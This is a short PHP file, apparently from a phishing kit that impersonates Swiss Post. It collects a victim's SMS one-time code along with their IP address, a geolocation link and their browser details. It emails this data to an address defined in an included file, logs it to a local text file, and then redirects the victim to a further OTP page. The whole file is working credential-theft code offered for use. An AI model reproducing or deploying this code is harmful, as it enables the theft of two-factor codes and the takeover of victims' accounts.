<?php
require_once('04-amassuo.php');
$IP = getenv("REMOTE_ADDR");
$message = "--++-----[ 💎 SMS1  💎  ]-----++--\n";
$message .= " [ SMS1 ] : [  ".$_POST['sms1']." ] \n";
$message .= "-------------- IP Infos ------------\n";
$message .= "https://geoiptool.com/en/?ip=$IP\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- 04-amassuo ----------------------\n";
$sender = "SMS1 Switzerland Post";
$subject = "SMS1 Die Post [ " . $IP . " ] ";
$email = "".$EX445093_REMOT."";
_mail($email,$subject,$message);
    $text = fopen('../mlafta.txt', 'a');
fwrite($text, $message);


header("Location: ../otp/sms2.php");
?>